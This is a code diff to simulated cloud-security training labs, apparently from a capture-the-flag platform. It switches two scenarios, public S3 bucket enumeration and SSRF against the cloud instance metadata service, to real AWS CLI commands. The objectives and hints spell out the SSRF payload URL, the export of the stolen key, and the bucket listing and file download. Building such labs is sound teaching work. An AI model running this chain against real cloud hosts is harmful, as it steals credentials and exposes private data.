@@ -12,47 +12,44 @@ export const cloudSecurityLabs: LabScenario[] = [
     difficulty: 'Easy',
     category: 'Cloud',
     briefing:
-      'Meridian Corp hosts static assets on a cloud object storage bucket. Recon revealed the bucket name ' +
-      '(meridian-corp-backups) — check whether it was left with public read access, a shockingly common ' +
-      'real-world cloud misconfiguration. A bucket listing only shows you filenames; you still have to fetch ' +
-      'each object explicitly, and the most sensitive file here is hidden behind a nested prefix that the ' +
-      'top-level listing does not expand.',
+      'Meridian Corp hosts static assets on an S3 bucket. Recon revealed the bucket name ' +
+      '(meridian-corp-backups) — check whether it was left with public read access, using the real AWS CLI, ' +
+      'the same shockingly common real-world cloud misconfiguration. A bucket listing only shows you ' +
+      'filenames; you still have to fetch each object explicitly, and the most sensitive file here is hidden ' +
+      'behind a nested prefix that the top-level listing does not expand.',
     objectives: [
-      { text: 'curl "http://10.10.106.1/meridian-corp-backups/"', why: 'This mirrors `aws s3 ls` against a bucket with no credentials — if it returns a listing instead of an AccessDenied error, public read is confirmed. Note the objects AND the archive/ prefix at the bottom; prefixes are subfolders that need their own listing request.' },
-      { text: 'curl "http://10.10.106.1/meridian-corp-backups/db-backup-2026-07.sql"', why: 'Do not assume the first-listed file is the sensitive one — real bucket-leak triage means checking each object. This one turns out to hold only a stale admin password hash, not the crown jewels.' },
-      { text: 'curl "http://10.10.106.1/meridian-corp-backups/archive/"', why: 'List the nested prefix noticed in the first request. Attackers routinely miss data hidden one folder deeper because the top-level listing looked "handled" — this step is exactly why thorough bucket enumeration matters.' },
-      { text: 'curl "http://10.10.106.1/meridian-corp-backups/archive/q3-2026-payroll-final.csv"', why: 'Fetch the actual sensitive object by its exact key, discovered from the nested listing. This is the real payroll export — and the flag.' },
+      { text: 'aws s3 ls s3://meridian-corp-backups/', why: 'If this returns a listing instead of an AccessDenied error with zero credentials configured, public read is confirmed. Note the objects AND the "PRE archive/" line at the top — PRE marks a prefix (subfolder) that needs its own separate listing request.' },
+      { text: 'aws s3 cp s3://meridian-corp-backups/db-backup-2026-07.sql -', why: 'Do not assume the first-listed file is the sensitive one — real bucket-leak triage means checking each object. This one turns out to hold only a stale admin password hash, not the crown jewels.' },
+      { text: 'aws s3 ls s3://meridian-corp-backups/archive/', why: 'List the nested prefix noticed in the first request. Attackers routinely miss data hidden one folder deeper because the top-level listing looked "handled" — this step is exactly why thorough bucket enumeration matters.' },
+      { text: 'aws s3 cp s3://meridian-corp-backups/archive/q3-2026-payroll-final.csv -', why: 'Fetch the actual sensitive object by its exact key, discovered from the nested listing. This is the real payroll export — and the flag.' },
     ],
     hints: [
-      'curl "http://10.10.106.1/meridian-corp-backups/"  to list top-level bucket contents — notice the archive/ prefix.',
-      'curl "http://10.10.106.1/meridian-corp-backups/db-backup-2026-07.sql" — worth checking, but not the sensitive file.',
-      'curl "http://10.10.106.1/meridian-corp-backups/archive/" to list the nested prefix.',
-      'curl "http://10.10.106.1/meridian-corp-backups/archive/q3-2026-payroll-final.csv" to download the file the nested listing revealed.',
+      'aws s3 ls s3://meridian-corp-backups/  to list top-level bucket contents — notice the "PRE archive/" line.',
+      'aws s3 cp s3://meridian-corp-backups/db-backup-2026-07.sql - — worth checking, but not the sensitive file.',
+      'aws s3 ls s3://meridian-corp-backups/archive/ to list the nested prefix.',
+      'aws s3 cp s3://meridian-corp-backups/archive/q3-2026-payroll-final.csv - to download the file the nested listing revealed.',
     ],
     totalFlags: 1,
     attacker: attacker(),
     network: [
       {
         hostname: 's3-emulator', ip: '10.10.106.1', os: 'Cloud object storage (S3-compatible)',
-        services: [{
-          port: 80, name: 'http', version: 'S3-compatible object storage',
-          http: {
-            '/meridian-corp-backups/':
-              '<ListBucketResult><Contents><Key>db-backup-2026-07.sql</Key></Contents>' +
-              '<Contents><Key>employee-export.csv</Key></Contents>' +
-              '<CommonPrefixes><Prefix>archive/</Prefix></CommonPrefixes></ListBucketResult>\n' +
-              '<!-- ACL: public-read (misconfigured) -->',
-            '/meridian-corp-backups/db-backup-2026-07.sql': '-- Meridian Corp database backup\n-- WARNING: this bucket should never have been public\nINSERT INTO admin_users VALUES (1, \'admin\', \'hash...\');\n',
-            '/meridian-corp-backups/employee-export.csv': 'name,email,ssn\nJohn Doe,john@meridiancorp.example,REDACTED\n',
-            '/meridian-corp-backups/archive/':
-              '<ListBucketResult><Contents><Key>archive/q3-2026-payroll-final.csv</Key></Contents></ListBucketResult>\n' +
-              '<!-- nested prefix — not shown by the top-level listing\'s object list, only its CommonPrefixes -->',
-            '/meridian-corp-backups/archive/q3-2026-payroll-final.csv':
-              'employee_id,name,net_pay\n4471,J. Alvarez,4820.00\n' +
-              '-- flag{public_s3_bucket_leaks_database_backup}',
-          },
-        }],
+        services: [{ port: 80, name: 'http', version: 'S3-compatible object storage' }],
         users: [], root: dir({}),
+        awsAccount: {
+          accountId: '558822104471',
+          roles: [],
+          credentials: [],
+          buckets: [{
+            name: 'meridian-corp-backups',
+            publicRead: true,
+            objects: [
+              { key: 'db-backup-2026-07.sql', content: '-- Meridian Corp database backup\n-- WARNING: this bucket should never have been public\nINSERT INTO admin_users VALUES (1, \'admin\', \'hash...\');\n' },
+              { key: 'employee-export.csv', content: 'name,email,ssn\nJohn Doe,john@meridiancorp.example,REDACTED\n' },
+              { key: 'archive/q3-2026-payroll-final.csv', content: 'employee_id,name,net_pay\n4471,J. Alvarez,4820.00\n-- flag{public_s3_bucket_leaks_database_backup}' },
+            ],
+          }],
+        },
       } as HostDef,
     ],
   },
@@ -64,18 +61,22 @@ export const cloudSecurityLabs: LabScenario[] = [
     briefing:
       'An internal reporting dashboard hosted on cloud infrastructure fetches a "data source" URL you control. ' +
       'This is the exact SSRF pattern from the Web Application Hacking module — now applied against the cloud ' +
-      'instance metadata service to steal the instance\'s temporary IAM role credentials. The stolen ' +
-      'AccessKeyId alone proves the leak; using it to authenticate to a second, gated internal endpoint proves ' +
-      'the real, reportable impact.',
+      'instance metadata service to steal the instance\'s temporary IAM role credentials. Leaking the ' +
+      'AccessKeyId is only half the exercise — a stolen key is worthless until you actually export it and use ' +
+      'it with the real AWS CLI, exactly like a real attacker (or a real cloud incident responder tracing one) would.',
     objectives: [
       { text: 'curl "http://10.10.106.2/dashboard/datasource?url=https://example.com/data.json"', why: 'Confirm the data-source feature performs a genuine server-side fetch with a normal, harmless URL before attempting anything malicious — standard SSRF confirmation methodology.' },
-      { text: 'curl "http://10.10.106.2/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role"', why: 'Redirect the fetch to the cloud instance metadata service — the same address every major cloud provider uses, and unreachable from outside the instance, which is exactly why SSRF is how it gets stolen. This leaks a temporary AccessKeyId, not the flag itself.' },
-      { text: 'curl -H "X-Access-Key-Id: AKIA-SIM-REPORT9F3" "http://10.10.106.2/internal/reports-export"', why: 'A stolen credential is only dangerous once it is used. Authenticating to the gated internal export endpoint with the leaked AccessKeyId demonstrates the full, reportable impact chain: SSRF -> metadata theft -> unauthorized data access.' },
+      { text: 'curl "http://10.10.106.2/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role"', why: 'Redirect the fetch to the cloud instance metadata service — the same address every major cloud provider uses, and unreachable from outside the instance, which is exactly why SSRF is how it gets stolen. This leaks a temporary AccessKeyId.' },
+      { text: 'export AWS_ACCESS_KEY_ID=AKIA-SIM-REPORT9F3', why: 'A leaked key does nothing sitting in a terminal scrollback — exporting it into your own shell environment is the exact same step a real operator (or a real attacker) takes before using the AWS CLI with a stolen credential.' },
+      { text: 'aws sts get-caller-identity', why: 'The real first move after obtaining any AWS credential, stolen or not — confirms the key is live and shows exactly which role/account it grants before you go looking for what it can reach.' },
+      { text: 'aws s3 ls s3://meridian-corp-reports-export/ then aws s3 cp the file it lists', why: 'This is the full, reportable impact chain: SSRF -> instance metadata theft -> a real, working AWS credential -> unauthorized data access, demonstrated with the actual tool a real analyst would use.' },
     ],
     hints: [
       'curl "http://10.10.106.2/dashboard/datasource?url=https://example.com/data.json" — confirms normal behavior first.',
       'curl "http://10.10.106.2/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role" — leaks a temporary AccessKeyId.',
-      'curl -H "X-Access-Key-Id: AKIA-SIM-REPORT9F3" "http://10.10.106.2/internal/reports-export" — use the leaked key against the gated endpoint.',
+      'export AWS_ACCESS_KEY_ID=AKIA-SIM-REPORT9F3',
+      'aws sts get-caller-identity — confirms the stolen key is live and which role it grants.',
+      'aws s3 ls s3://meridian-corp-reports-export/ then aws s3 cp s3://meridian-corp-reports-export/full-financials.csv - for the flag.',
     ],
     totalFlags: 1,
     attacker: attacker(),
@@ -89,18 +90,22 @@ export const cloudSecurityLabs: LabScenario[] = [
             {
               kind: 'ssrf', path: '/dashboard/datasource', param: 'url',
               triggerSubstrings: ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1'],
-              vulnerableResponse: '{"AccessKeyId":"AKIA-SIM-REPORT9F3","SecretAccessKey":"REDACTED-VIA-SSRF","Role":"reporting-role","note":"use AccessKeyId against /internal/reports-export"}',
+              vulnerableResponse: '{"AccessKeyId":"AKIA-SIM-REPORT9F3","SecretAccessKey":"REDACTED-VIA-SSRF","Role":"reporting-role","note":"export AWS_ACCESS_KEY_ID and use the real AWS CLI from here"}',
               normalResponse: '{"status":"ok","rows":12}',
-            },
-            {
-              kind: 'ssrf', path: '/internal/reports-export', param: 'X-Access-Key-Id', location: 'header',
-              triggerSubstrings: ['AKIA-SIM-REPORT9F3'],
-              vulnerableResponse: '{"status":"export_ready","download":"full-financials.csv","flag":"flag{cloud_metadata_ssrf_leaks_iam_role_credentials}"}',
-              normalResponse: '{"error":"missing or invalid credentials"}',
             },
           ],
         }],
         users: [], root: dir({}),
+        awsAccount: {
+          accountId: '558822104471',
+          roles: [{ name: 'reporting-role', policySummary: 'AmazonS3ReadOnlyAccess (scoped to meridian-corp-reports-export)' }],
+          credentials: [{ accessKeyId: 'AKIA-SIM-REPORT9F3', secretAccessKey: 'REDACTED-VIA-SSRF', role: 'reporting-role', accountId: '558822104471', arn: 'arn:aws:sts::558822104471:assumed-role/reporting-role/i-0a1b2c3d4e5f' }],
+          buckets: [{
+            name: 'meridian-corp-reports-export',
+            requiredRole: 'reporting-role',
+            objects: [{ key: 'full-financials.csv', content: 'quarter,revenue,notes\nQ2-2026,4820000,internal export\nflag{cloud_metadata_ssrf_leaks_iam_role_credentials}' }],
+          }],
+        },
       } as HostDef,
     ],
   },
